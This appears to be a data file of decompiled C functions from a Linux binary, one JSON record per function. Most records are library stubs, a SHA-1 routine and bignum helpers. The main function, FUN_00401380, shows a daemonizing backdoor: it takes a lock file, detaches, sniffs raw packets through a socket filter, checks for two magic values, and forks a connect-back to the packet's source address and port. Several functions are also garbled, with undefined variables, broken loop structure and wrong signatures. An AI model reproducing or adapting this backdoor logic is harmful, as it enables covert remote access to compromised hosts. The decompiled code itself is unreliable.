{"Function Name": "_DT_INIT", "Address": "00400fe0", "Source Code": "void _DT_INIT(void)\n{\n    \n    if (gmonStartPointer) {\n        \n        gmonStartFunction();\n    }\n}"}
{"Function Name": "FUN_00401000", "Address": "00401000", "Source Code": "void executeFunction(void) \n{\n    (*(code *)functionPointer)(); \n}"}
{"Function Name": "<EXTERNAL>::__ctype_toupper_loc", "Address": "00401010", "Source Code": "__int32_t ** get_toupper_location(void)\n{\n    \n    \n    return (__int32_t **)(*(code *)toupper_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::raise", "Address": "00401020", "Source Code": "int raise(int signal_number)\n{\n    \n    return (*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::free", "Address": "00401030", "Source Code": "void free(void *pointer_to_free_function)\n{\n    \n    (*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::recv", "Address": "00401040", "Source Code": "ssize_t recv(int file_descriptor, void *buffer, size_t num_bytes, int flags)\n{\n    \n    return (*(code *)recv_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::strcasecmp", "Address": "00401050", "Source Code": "int strcasecmp(char *string1, char *string2)\n{\n    \n    return (*(code *)caseInsensitiveCompareFunction)();\n}"}
{"Function Name": "<EXTERNAL>::__errno_location", "Address": "00401060", "Source Code": "int *get_errno_address(void)  \n{\n    return (int *)(*(code *)errno_function_pointer)();  \n}"}
{"Function Name": "<EXTERNAL>::strcpy", "Address": "00401070", "Source Code": "char * strcpy(char *destination, char *source)\n{\n    \n    return (char *)(*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::qsort", "Address": "00401080", "Source Code": "void qsort(void *base_pointer, size_t num_elements, size_t element_size, __compar_fn_t comparison_function)\n{\n    \n    \n    (*(code *)qsort_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fread", "Address": "00401090", "Source Code": "size_t fread(void *buffer, size_t element_size, size_t element_count, FILE *file_stream)\n{\n    \n    return (*(code *)fread_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::setsockopt", "Address": "004010a0", "Source Code": "int setsockopt(int socket_fd, int option_level, int option_name, void *option_value, socklen_t option_length)\n{\n    \n    return (*(code *)setsockopt_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fclose", "Address": "004010b0", "Source Code": "int fclose(FILE *file_stream)\n{\n    \n    return (*(code *)fclose_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::strlen", "Address": "004010c0", "Source Code": "size_t strlen(char *string_pointer)  \n{\n    return (*(code *)strlen_function_pointer)();  \n}"}
{"Function Name": "<EXTERNAL>::chdir", "Address": "004010d0", "Source Code": "int chdir(char *path)\n{\n    \n    return (*(code *)chdir_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::send", "Address": "004010e0", "Source Code": "ssize_t send(int file_descriptor, void *buffer, size_t num_bytes, int flags) \n{\n    return (*(code *)PTR_send_00649080)(); \n}"}
{"Function Name": "<EXTERNAL>::strchr", "Address": "004010f0", "Source Code": "char * strchr(char *string_ptr, int character)\n{\n    \n    return (char *)(*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::snprintf", "Address": "00401100", "Source Code": "int snprintf(char *output_string, size_t max_length, char *format_string, ...) {\n    \n    return (*(code *)snprintf_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::nanosleep", "Address": "00401110", "Source Code": "int nanosleep(timespec *requestedTime, timespec *remainingTime)\n{\n    \n    return (*(code *)nanosleepFunctionPointer)();\n}"}
{"Function Name": "<EXTERNAL>::memset", "Address": "00401120", "Source Code": "void * memset(void *memory_pointer, int value_to_set, size_t num_bytes)\n{\n    \n    \n    return (void *)(*(code *)memset_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fgetc", "Address": "00401130", "Source Code": "int fgetc(FILE *file_pointer)\n{\n    \n    return (*(code *)fgetc_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::close", "Address": "00401140", "Source Code": "int close(int file_descriptor) \n{\n    return (*(code *)close_function_pointer)(); \n}"}
{"Function Name": "<EXTERNAL>::setsid", "Address": "00401150", "Source Code": "__pid_t create_session(void)  \n{\n    return (*(code *)setsid_function_pointer)();  \n}"}
{"Function Name": "<EXTERNAL>::fputc", "Address": "00401160", "Source Code": "int fputc(int character, FILE *file_pointer)\n{\n    \n    return (*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::memchr", "Address": "00401170", "Source Code": "void * memchr(void *memory_block, int character, size_t size)\n{\n    \n    return (void *)(*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::read", "Address": "00401180", "Source Code": "ssize_t read(int file_descriptor, void *buffer, size_t num_bytes) \n{\n    return (*(code *)read_function_pointer)(); \n}"}
{"Function Name": "<EXTERNAL>::__libc_start_main", "Address": "00401190", "Source Code": "void main_entry_point(void) \n{\n    (*(code *)function_pointer)(); \n}"}
{"Function Name": "<EXTERNAL>::memcmp", "Address": "004011a0", "Source Code": "int memcmp(void *ptr1, void *ptr2, size_t size)\n{\n    \n    return (*(code *)functionPtr_memcmp)();\n}"}
{"Function Name": "<EXTERNAL>::calloc", "Address": "004011b0", "Source Code": "void * calloc(size_t num_elements, size_t element_size)\n{\n    \n    return (void *)(*(code *)calloc_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::strcmp", "Address": "004011c0", "Source Code": "int strcmp(char *string1, char *string2)\n{\n    \n    return (*(code *)strcmp_ptr)();\n}"}
{"Function Name": "<EXTERNAL>::signal", "Address": "004011d0", "Source Code": "__sighandler_t signal(int signal_number, __sighandler_t signal_handler)\n{\n    \n    return (__sighandler_t)(*(code *)signal_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fprintf", "Address": "004011e0", "Source Code": "int fprintf(FILE *file_pointer, char *format_string, ...) {\n    \n    return (*(code *)function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::ftell", "Address": "004011f0", "Source Code": "long ftell(FILE *file_stream)\n{\n    \n    return (*(code *)file_position_function)();\n}"}
{"Function Name": "<EXTERNAL>::__gmon_start__", "Address": "00401200", "Source Code": "void gmon_start_function(void) \n{\n    (*(code *)gmon_start_pointer)(); \n}"}
{"Function Name": "<EXTERNAL>::memcpy", "Address": "00401210", "Source Code": "void * memcpy(void *destination, void *source, size_t num_bytes)\n{\n    \n    return (void *)(*(code *)memcpy_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::time", "Address": "00401220", "Source Code": "time_t time(time_t *timer_pointer)\n{\n    \n    return (*(code *)time_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fileno", "Address": "00401230", "Source Code": "int fileno(FILE *file_stream)\n{\n    \n    return (*(code *)file_descriptor_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::malloc", "Address": "00401240", "Source Code": "void * malloc(size_t size_in_bytes)\n{\n    \n    \n    return (void *)(*(code *)memory_allocator_function)();\n}"}
{"Function Name": "<EXTERNAL>::recvfrom", "Address": "00401250", "Source Code": "ssize_t recvfrom(int socket_fd, void *buffer, size_t buffer_size, int flags, sockaddr *address, socklen_t *address_length)\n{\n    \n    return (*(code *)recvfrom_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fseek", "Address": "00401260", "Source Code": "int fseek(FILE *file_stream, long offset, int whence_value)\n{\n    \n    return (*(code *)fseek_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::realloc", "Address": "00401270", "Source Code": "void * realloc(void *pointer, size_t size)\n{\n    \n    return (void *)(*(code *)realloc_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::setvbuf", "Address": "00401280", "Source Code": "int setvbuf(FILE *stream, char *buffer, int mode, size_t size)\n{\n    \n    return (*(code *)PTR_setvbuf_00649150)();\n}"}
{"Function Name": "<EXTERNAL>::memmove", "Address": "00401290", "Source Code": "void * memmove(void *destination, void *source, size_t size)\n{\n    \n    return (void *)(*(code *)memmove_address)();\n}"}
{"Function Name": "<EXTERNAL>::open", "Address": "004012a0", "Source Code": "int open(char *file_name, int open_flags, ...) {\n    \n    return (*(code *)open_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::popen", "Address": "004012b0", "Source Code": "FILE * popen(char *command, char *modes)\n{\n    \n    return (FILE *)(*(code *)popen_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fopen", "Address": "004012c0", "Source Code": "FILE * fopen(char *filename, char *mode)\n{\n    \n    return (FILE *)(*(code *)fopen_ptr)();\n}"}
{"Function Name": "<EXTERNAL>::strtok", "Address": "004012d0", "Source Code": "char * strtok(char *input_string, char *delimiters)\n{\n    \n    return (char *)(*(code *)strtok_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::gmtime", "Address": "004012e0", "Source Code": "tm * gmtime(time_t *timer_pointer)\n{\n    \n    return (tm *)(*(code *)gmtime_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::flock", "Address": "004012f0", "Source Code": "void flock(void) \n{\n    (*(code *)flock_function_pointer)(); \n}"}
{"Function Name": "<EXTERNAL>::exit", "Address": "00401300", "Source Code": "void exit(int status_code)\n{\n    \n    (*(code *)exit_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::connect", "Address": "00401310", "Source Code": "int connect(int file_descriptor, sockaddr *address, socklen_t length)\n{\n    \n    return (*(code *)connection_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::strerror", "Address": "00401320", "Source Code": "char * strerror(int error_number)\n{\n    \n    return (char *)(*(code *)error_string_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::sleep", "Address": "00401330", "Source Code": "uint sleep(uint seconds)\n{\n    \n    return (*(code *)sleep_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::fork", "Address": "00401340", "Source Code": "__pid_t fork(void) \n{\n    return (*(code *)fork_function_pointer)(); \n}"}
{"Function Name": "<EXTERNAL>::strstr", "Address": "00401350", "Source Code": "char * strstr(char *haystack, char *needle)\n{\n    \n    return (char *)(*(code *)strstr_function_pointer)();\n}"}
{"Function Name": "<EXTERNAL>::rand", "Address": "00401360", "Source Code": "int randomFunction(void) \n{\n    return (*(code *)randomFunctionPointer)(); \n}"}
{"Function Name": "<EXTERNAL>::socket", "Address": "00401370", "Source Code": "int socket(int domain, int type, int protocol)\n{\n    \n    return (*_DAT_006491c8)();\n}"}
{"Function Name": "FUN_00401380", "Address": "00401380", "Source Code": "void FUN_00401380(void)\n{\n    int fileDescriptor; \n    __pid_t processID; \n    void *dataBuffer; \n    ssize_t recvReturnValue; \n    uint extractedValue1, extractedValue2; \n    \n    fileDescriptor = open(\"/var/run/initd.lock\", 0x42, 0x1b6);\n    \n    fileDescriptor = flock(fileDescriptor, 6);\n    \n    if (fileDescriptor != 0 && *__errno_location() == 0xb) goto LAB_00401558;\n    \n    processID = fork();\n    \n    if (processID != -1 && processID == 0) {\n        \n        close(0);\n        close(1);\n        close(2);\n        \n        setsid();\n        \n        signal(2, (__sighandler_t)0x1); \n        signal(1, (__sighandler_t)0x1); \n        signal(3, (__sighandler_t)0x1); \n        signal(0xd, (__sighandler_t)0x1); \n        signal(0x16, (__sighandler_t)0x1); \n        signal(0x15, (__sighandler_t)0x1); \n        signal(0x11, (__sighandler_t)0x1); \n        \n        sleep(10);\n        \n        dataBuffer = malloc(0x10000);\n        \n        fileDescriptor = socket(0x11, 3, 0x300);\n        \n        if (fileDescriptor >= 0) {\n            \n            FUN_00401a30(fileDescriptor);\n            \n            while (true) {\n                do {\n                    \n                    recvReturnValue = recvfrom(fileDescriptor, dataBuffer, 0x10000, 0, (sockaddr *)0x0, (socklen_t *)0x0);\n                } while ((int)recvReturnValue < 0); \n                _DAT_006491e4++; \n                \n                extractedValue1 = (*(byte *)((long)dataBuffer + 0xe) & 0xf) * 4;\n            } while (extractedValue1 < 0x14 || \n                (*(byte *)((long)dataBuffer + (long)(int)extractedValue1 + 0xe) >> 4) * 4 < 0x14);\n            \n            extractedValue1 = *(uint *)((long)dataBuffer + 0xe + (long)(int)extractedValue1 + 2);\n            extractedValue2 = *(uint *)((long)dataBuffer + 0xe + (long)(int)extractedValue1 + 4);\n            \n            if (((extractedValue1 >> 0x18 | (extractedValue1 & 0xff0000) >> 8 | (extractedValue1 & 0xff00) << 8 | extractedValue1 << 0x18) != 0x4430cd9f) ||\n                ((extractedValue2 >> 0x18 | (extractedValue2 & 0xff0000) >> 8 | (extractedValue2 & 0xff00) << 8 | extractedValue2 << 0x18) != 0x5e142766)) {\n                \n                processID = fork();\n                \n                if (processID == 0) break; \n                \n                signal(0x11, (__sighandler_t)0x1);\n            }\n            \n            FUN_00401770(*(undefined4 *)((long)dataBuffer + 0x1a), *(undefined2 *)((long)dataBuffer + (long)(int)extractedValue1 + 0xe));\n        }\n    }\nLAB_00401558:\n    \n    exit(0);\n}"}
{"Function Name": "_FINI_0", "Address": "00401610", "Source Code": "void _FINI_0(void) \n{\n    if (isInitialized == '\\0') { \n        initializeFunction(); \n        isInitialized = '\\x01'; \n    }\n}"}
{"Function Name": "_INIT_0", "Address": "00401630", "Source Code": "void initializeFunction(void) \n{\n    functionCall(); \n}"}
{"Function Name": "FUN_00401660", "Address": "00401660", "Source Code": "void executeFunction(void) \n{\n    helperFunctionA(); \n    helperFunctionB(); \n}"}
{"Function Name": "FUN_00401680", "Address": "00401680", "Source Code": "void FUN_00401680(int *file_descriptor_array)\n{\n    \n    close(*file_descriptor_array);\n    \n    \n    process_third_element(*(undefined8 *)(file_descriptor_array + 2));\n    \n    \n    process_fourth_element(*(undefined8 *)(file_descriptor_array + 4));\n}"}
{"Function Name": "FUN_004016a0", "Address": "004016a0", "Source Code": "int FUN_004016a0(undefined4 address, undefined2 port)\n{\n    int socket_fd; \n    int connect_result; \n    sockaddr socket_address; \n    socket_address.sa_family = 2; \n    memset(socket_address.sa_data + 6, 0, 8); \n    socket_address.sa_data._0_2_ = port; \n    socket_address.sa_data._2_4_ = address; \n    socket_fd = socket(2, 1, 0); \n    if (socket_fd != -1) { \n        connect_result = connect(socket_fd, &socket_address, 0x10); \n        if (connect_result != -1) { \n            return socket_fd; \n        }\n    }\n    exit(0); \n}"}
{"Function Name": "FUN_00401a30", "Address": "00401a30", "Source Code": "void FUN_00401a30(int socket_fd) \n{\n    long loop_counter; \n    undefined8 *data_pointer; \n    undefined8 data_array[31]; \n    undefined2 option_value[4] = {0x1e}; \n    data_pointer = &DAT_00435760; \n    for (loop_counter = 0x1e; loop_counter != 0; loop_counter--) { \n        data_array[0x1e - loop_counter] = *data_pointer++; \n    }\n    if (setsockopt(socket_fd, 1, 0x1a, option_value, 0x10) < 0) { \n        exit(0); \n    }\n}"}
{"Function Name": "FUN_00401a90", "Address": "00401a90", "Source Code": "int FUN_00401a90(int *inputArray1, int *inputArray2)\n{\n    int result1 = -1; \n    int result2 = -1; \n    \n    if (*inputArray1 - 1U < 0xf) {\n        \n        result1 = *(int *)(&DAT_004386a0 + (ulong)(*inputArray1 - 1U) * 4);\n    }\n    \n    \n    if (*inputArray2 - 1U < 0xf) {\n        \n        result2 = *(int *)(&DAT_004386a0 + (ulong)(*inputArray2 - 1U) * 4);\n    }\n    \n    result1 -= result2;\n    \n    if (result1 == 0) {\n        result1 = inputArray1[6] - inputArray2[6];\n    }\n    \n    \n    return result1;\n}"}
{"Function Name": "FUN_00401b30", "Address": "00401b30", "Source Code": "undefined8 FUN_00401b30(long inputParam,uint *inputArray)\n{\n    uint inputValue, stateVar2, stateVar3, stateVar4, index = 0, tempVar1, tempVar2, stateVar1, stateVar5, tempVar3;\n    ulong uVar8;\n    uint transformedValues[80]; \n    uint *currentPointer = transformedValues + 0xd; \n    \n    do {\n        inputValue = *inputArray++; \n        transformedValues[index++] = inputValue >> 0x18 | (inputValue & 0xff0000) >> 8 | (inputValue & 0xff00) << 8 | inputValue << 0x18; \n    } while (index != 0x10); \n    \n    index = *(uint *)(inputParam + 0x10);\n    inputValue = *(uint *)(inputParam + 8);\n    stateVar2 = *(uint *)(inputParam + 0xc);\n    stateVar3 = *(uint *)(inputParam + 0x14);\n    stateVar4 = *(uint *)(inputParam + 0x18);\n    \n    do {\n        tempVar1 = currentPointer[-5] ^ *currentPointer ^ currentPointer[-0xb] ^ currentPointer[-0xd]; \n        currentPointer[3] = tempVar1 << 1 | tempVar1 >> 0x1f; \n    } while (++currentPointer != transformedValues + 0x4d); \n    currentPointer = transformedValues; \n    tempVar1 = stateVar4; \n    tempVar2 = stateVar3; \n    stateVar1 = index; \n    stateVar5 = stateVar2; \n    tempVar3 = inputValue; \n    \n    do {\n        tempVar1 += (tempVar3 << 5 | tempVar3 >> 0x1b) + *currentPointer + 0x5a827999 + ((tempVar2 ^ stateVar1) & stateVar5 ^ tempVar2); \n        stateVar5 = stateVar5 << 0x1e | stateVar5 >> 2; \n        tempVar2 = ((stateVar1 ^ stateVar5) & tempVar3 ^ stateVar1) + tempVar2 + 0x5a827999 + (tempVar1 * 0x20 | tempVar1 >> 0x1b) + currentPointer[1]; \n        tempVar3 = tempVar3 << 0x1e | tempVar3 >> 2; \n        stateVar1 += 0x5a827999 + (tempVar2 * 0x20 | tempVar2 >> 0x1b) + currentPointer[2] + ((tempVar3 ^ stateVar5) & tempVar1 ^ stateVar5); \n        tempVar1 = tempVar1 * 0x40000000 | tempVar1 >> 2; \n        stateVar5 += 0x5a827999 + (stateVar1 * 0x20 | stateVar1 >> 0x1b) + currentPointer[3] + ((tempVar1 ^ tempVar3) & tempVar2 ^ tempVar3); \n        tempVar2 = tempVar2 * 0x40000000 | tempVar2 >> 2; \n        currentPointer += 5; \n    } while (currentPointer != transformedValues + 0x14); \n    currentPointer = transformedValues + 0x14; \n    \n    do {\n        tempVar1 += (tempVar3 << 5 | tempVar3 >> 0x1b) + 0x6ed9eba1 + (stateVar1 ^ stateVar5 ^ tempVar2) + *currentPointer; \n        stateVar5 = stateVar5 << 0x1e | stateVar5 >> 2; \n        tempVar2 = (tempVar3 ^ stateVar5 ^ stateVar1) + tempVar2 + 0x6ed9eba1 + (tempVar1 * 0x20 | tempVar1 >> 0x1b) + currentPointer[1]; \n        tempVar3 = tempVar3 << 0x1e | tempVar3 >> 2; \n        stateVar1 += 0x6ed9eba1 + (tempVar2 * 0x20 | tempVar2 >> 0x1b) + currentPointer[2] + (tempVar3 ^ stateVar5 ^ tempVar1); \n        tempVar1 = tempVar1 * 0x40000000 | tempVar1 >> 2; \n        stateVar5 += 0x6ed9eba1 + (stateVar1 * 0x20 | stateVar1 >> 0x1b) + currentPointer[3] + (tempVar1 ^ tempVar3 ^ tempVar2); \n        tempVar2 = tempVar2 * 0x40000000 | tempVar2 >> 2; \n        tempVar3 += 0x6ed9eba1 + (stateVar5 * 0x20 | stateVar5 >> 0x1b) + currentPointer[4] + (tempVar2 ^ tempVar1 ^ stateVar1); \n        stateVar1 = stateVar1 * 0x40000000 | stateVar1 >> 2; \n        currentPointer += 5; \n    } while (currentPointer != transformedValues + 0x28); \n    currentPointer = transformedValues + 0x28; \n    \n    do {\n        tempVar1 += (tempVar3 << 5 | tempVar3 >> 0x1b) + *currentPointer + -0x70e44324 + ((stateVar5 | stateVar1) & tempVar2 | stateVar5 & stateVar1); \n        stateVar5 = stateVar5 << 0x1e | stateVar5 >> 2; \n        tempVar2 = ((stateVar5 | tempVar3) & stateVar1 | stateVar5 & tempVar3) + tempVar2 + 0x8f1bbcdc + (tempVar1 * 0x20 | tempVar1 >> 0x1b) + currentPointer[1]; \n        tempVar3 = tempVar3 << 0x1e | tempVar3 >> 2; \n        stateVar1 += 0x8f1bbcdc + (tempVar2 * 0x20 | tempVar2 >> 0x1b) + currentPointer[2] + ((tempVar1 | tempVar3) & stateVar5 | tempVar1 & tempVar3); \n        tempVar1 = tempVar1 * 0x40000000 | tempVar1 >> 2; \n        stateVar5 += 0x8f1bbcdc + (stateVar1 * 0x20 | stateVar1 >> 0x1b) + currentPointer[3] + ((tempVar2 | tempVar1) & tempVar3 | tempVar2 & tempVar1); \n        tempVar2 = tempVar2 * 0x40000000 | tempVar2 >> 2; \n        currentPointer += 5; \n        tempVar3 += 0x8f1bbcdc + (stateVar5 * 0x20 | stateVar5 >> 0x1b) + *currentPointer + ((stateVar1 | tempVar2) & tempVar1 | stateVar1 & tempVar2); \n        stateVar1 = stateVar1 * 0x40000000 | stateVar1 >> 2; \n    } while (currentPointer != transformedValues + 0x3c); \n    currentPointer = transformedValues + 0x3c; \n    \n    do {\n        tempVar1 += (tempVar3 << 5 | tempVar3 >> 0x1b) + 0xca62c1d6 + (stateVar5 ^ stateVar1 ^ tempVar2) + *currentPointer; \n        stateVar5 = stateVar5 << 0x1e | stateVar5 >> 2; \n        tempVar2 = (tempVar3 ^ stateVar1 ^ stateVar5) + tempVar2 + 0xca62c1d6 + (tempVar1 * 0x20 | tempVar1 >> 0x1b) + currentPointer[1]; \n        tempVar3 = tempVar3 << 0x1e | tempVar3 >> 2; \n        stateVar1 += 0xca62c1d6 + (tempVar2 * 0x20 | tempVar2 >> 0x1b) + currentPointer[2] + (tempVar3 ^ stateVar5 ^ tempVar1); \n        tempVar1 = tempVar1 * 0x40000000 | tempVar1 >> 2; \n        stateVar5 += 0xca62c1d6 + (stateVar1 * 0x20 | stateVar1 >> 0x1b) + currentPointer[3] + (tempVar1 ^ tempVar3 ^ tempVar2); \n        tempVar2 = tempVar2 * 0x40000000 | tempVar2 >> 2; \n        tempVar3 += 0xca62c1d6 + (stateVar5 * 0x20 | stateVar5 >> 0x1b) + currentPointer[4] + (tempVar2 ^ tempVar1 ^ stateVar1); \n        stateVar1 = stateVar1 * 0x40000000 | stateVar1 >> 2; \n    } while (currentPointer != local_38); \n    \n    *(uint *)(inputParam + 8) = tempVar3 + inputValue; \n    *(uint *)(inputParam + 0xc) = stateVar5 + stateVar2; \n    *(uint *)(inputParam + 0x14) = tempVar2 + stateVar3; \n    *(uint *)(inputParam + 0x10) = stateVar1 + index; \n    *(uint *)(inputParam + 0x18) = tempVar1 + stateVar4; \n    return 0; \n}"}
{"Function Name": "FUN_00404e90", "Address": "00404e90", "Source Code": "void FUN_00404e90(void) \n{\n    free_function_pointer(); \n}"}
{"Function Name": "FUN_00404ea0", "Address": "00404ea0", "Source Code": "int FUN_00404ea0(void **param_1, void **param_2)\n{\n    \n    void *secondElementParam2 = param_2[1];\n    \n    void *secondElementParam1 = param_1[1];\n    \n    void *firstElementParam2 = *param_2;\n    \n    void *firstElementParam1 = *param_1;\n    \n    void *minSize = (secondElementParam1 <= secondElementParam2) ? secondElementParam1 : secondElementParam2;\n    \n    int comparisonResult = memcmp(firstElementParam1, firstElementParam2, (size_t)minSize);\n    \n    \n    if (comparisonResult == 0 && secondElementParam2 != secondElementParam1) {\n        \n        if (secondElementParam2 < secondElementParam1) {\n            \n            if (*(char *)((long)firstElementParam1 + (long)secondElementParam2) == '\\0') {\n                \n                char *charPointer = (char *)((long)firstElementParam1 + 1 + (long)secondElementParam2);\n                \n                while (*charPointer == '\\0') {\n                    \n                    if (charPointer == (char *)((long)secondElementParam1 + (long)firstElementParam1)) {\n                        return 0; \n                    }\n                    charPointer++; \n                }\n            }\n            return 1; \n        }\n        \n        if (secondElementParam1 < secondElementParam2 && *(char *)((long)firstElementParam2 + (long)secondElementParam1) == '\\0') {\n            \n            char *charPointer = (char *)((long)firstElementParam2 + 1 + (long)secondElementParam1);\n            \n            while (charPointer != (char *)((long)secondElementParam2 + (long)firstElementParam2)) {\n                \n                if (*charPointer != '\\0') {\n                    return -1;\n                }\n                charPointer++; \n            }\n            return 0; \n        }\n    }\n    return comparisonResult; \n}"}
{"Function Name": "FUN_00405a00", "Address": "00405a00", "Source Code": "int FUN_00405a00(long address, ulong threshold)\n{\n    \n    \n    \n    \n    \n    return (**(ulong **)(address + 0x10) <= threshold) ? -1 : 1;\n}"}
{"Function Name": "FUN_00405a20", "Address": "00405a20", "Source Code": "undefined8 FUN_00405a20(long memory_address, int requested_size)\n{\n    int new_allocation_size; \n    uint upper_bits; \n    void *reallocated_memory; \n    undefined8 unused_variable; \n    \n    upper_bits = (uint)(requested_size >> 0x1f) >> 0x1b;\n    \n    \n    new_allocation_size = requested_size + 0x40 + (upper_bits - (requested_size + upper_bits & 0x1f));\n    \n    \n    reallocated_memory = realloc(*(void **)(memory_address + 0x10), (long)new_allocation_size << 3);\n    \n    \n    if (reallocated_memory == (void *)0x0) {\n        return 0xfffffffe; \n    }\n    \n    *(void **)(memory_address + 0x10) = reallocated_memory;\n    \n    \n    *(int *)(memory_address + 4) = new_allocation_size;\n    \n    if ((int)upper_bits < new_allocation_size) {\n        \n        undefined8 *memory_pointer = (undefined8 *)((long)reallocated_memory + (long)(int)upper_bits * 8);\n        \n        \n        do {\n            *memory_pointer = 0; \n            memory_pointer++; \n        } while (memory_pointer != (undefined8 *)((long)reallocated_memory + ((long)(int)upper_bits + (ulong)(~upper_bits + new_allocation_size)) * 8 + 8));\n    }\n    \n    return 0; \n}"}
{"Function Name": "FUN_00405c20", "Address": "00405c20", "Source Code": "undefined8 * FUN_00405c20(long baseAddress)\n{\n    undefined8 *allocatedMemoryPointer; \n    long loopCounter; \n    allocatedMemoryPointer = (undefined8 *)malloc(0x338); \n    if (allocatedMemoryPointer != (undefined8 *)0x0) { \n        for (loopCounter = 0x67; loopCounter != 0; loopCounter--) { \n            *allocatedMemoryPointer = 0; \n            allocatedMemoryPointer++; \n        }\n    }\n    *(undefined8 **)(baseAddress + 0x22360) = allocatedMemoryPointer; \n    return allocatedMemoryPointer; \n}"}
{"Function Name": "FUN_00405c50", "Address": "00405c50", "Source Code": "int FUN_00405c50(byte *byte_array) \n{\n    \n    int calculated_value = ((uint)*byte_array * 0x100 + (uint)byte_array[1]) * 0x100 + (uint)byte_array[2];\n    \n    \n    \n    if (calculated_value == ((uint)byte_array[8] * 0x100 + (uint)byte_array[9]) * 0x100 + (uint)byte_array[10] &&\n        ((uint)byte_array[5] * 0x100 + (uint)byte_array[6]) * 0x100 + (uint)byte_array[7] == 0) {\n        \n        \n        return calculated_value;\n    }\n    \n    \n    return -0x11;\n}"}
{"Function Name": "FUN_00406490", "Address": "00406490", "Source Code": "void FUN_00406490(int *input_array)\n{\n    long long_value; \n    int index = *input_array; \n    if (index < 1) { \n        if (index != 0) { \n            return; \n        }\n    } else { \n        long *long_pointer = (long *)(*(long *)(input_array + 4) + -0x10 + (long)index * 8); \n        if (*(long *)(*(long *)(input_array + 4) + -8 + (long)index * 8) != 0) { \n            return; \n        }\n        while (--index != 0) { \n            long_value = *long_pointer--; \n            if (long_value != 0) { \n                *input_array = index; \n                return; \n            }\n        }\n        *input_array = 0; \n    }\n    input_array[2] = 0; \n}"}
{"Function Name": "FUN_004064f0", "Address": "004064f0", "Source Code": "void FUN_004064f0(int *input_array)\n{\n    \n    void *memory_pointer = *(void **)(input_array + 4);\n    \n    \n    if (memory_pointer != (void *)0x0) {\n        \n        int first_integer = *input_array;\n        \n        \n        if (first_integer > 0) {\n            \n            for (long index = 0; index < first_integer; index++) {\n                \n                *(undefined8 *)((long)memory_pointer + index * 8) = 0;\n            }\n        }\n        \n        \n        free(memory_pointer);\n        \n        \n        *(undefined8 *)(input_array + 4) = 0;\n        \n        \n        *input_array = 0;\n        \n        \n        input_array[1] = 0;\n        \n        \n        input_array[2] = 0;\n    }\n}"}
{"Function Name": "FUN_00406540", "Address": "00406540", "Source Code": "void FUN_00406540(long input_param, undefined8 first_param, undefined8 second_param, undefined8 third_param,\nundefined8 fourth_param, undefined8 fifth_param)\n{\n    ulong unsigned_long_value; \n    uint counter = 8; \n    long *long_pointer = (long *)&stack0x00000008; \n    long long_array[4] = {0, first_param, second_param, third_param}; \n    if (input_param != 0) { \n        do {\n            while (true) { \n                FUN_004064f0(); \n                unsigned_long_value = (ulong)counter; \n                if (counter < 0x30) break; \n                if (*long_pointer++ == 0) { \n                    return; \n                }\n            }\n            counter += 8; \n        } while (*(long *)((long)long_array + unsigned_long_value) != 0); \n    }\n    return; \n}"}
{"Function Name": "FUN_004065c0", "Address": "004065c0", "Source Code": "undefined8 checkArrayCondition(int *inputArray) \n{\n    if (inputArray[2] == 1) { \n        return 0xffffffff; \n    }\n    if (1 < *inputArray) { \n        return 1; \n    }\n    return performDefaultAction(); \n}"}
{"Function Name": "FUN_004065f0", "Address": "004065f0", "Source Code": "undefined8 FUN_004065f0(int *param_1, int *param_2)\n{\n    long calculatedLongValue; \n    int valueFromParam1; \n    undefined8 initialValue = 1; \n    ulong *dataPointerParam2; \n    ulong *dataPointerParam1; \n    valueFromParam1 = *param_1; \n    if (valueFromParam1 <= *param_2) { \n        if (*param_2 <= valueFromParam1) { \n            calculatedLongValue = (long)valueFromParam1 * 8 + -8; \n            dataPointerParam2 = (ulong *)(calculatedLongValue + *(long *)(param_2 + 4)); \n            dataPointerParam1 = (ulong *)(calculatedLongValue + *(long *)(param_1 + 4)); \n            if (valueFromParam1 < 1) { \n                return 0; \n            }\n            if (*dataPointerParam2 < *dataPointerParam1) { \n                return 1; \n            }\n            do {\n                dataPointerParam1--; \n                dataPointerParam2--; \n                if (dataPointerParam2 == dataPointerParam1) { \n                    return 0; \n                }\n                if (*dataPointerParam2 < *dataPointerParam1) { \n                    return 1; \n                }\n            } while (*dataPointerParam2 <= *dataPointerParam1); \n        }\n    }\n    return 0xffffffff; \n}"}
